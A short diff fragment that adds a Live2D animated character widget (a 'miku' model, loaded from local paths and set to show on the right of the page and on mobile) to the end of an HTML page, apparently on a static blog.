+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body>
+</html>
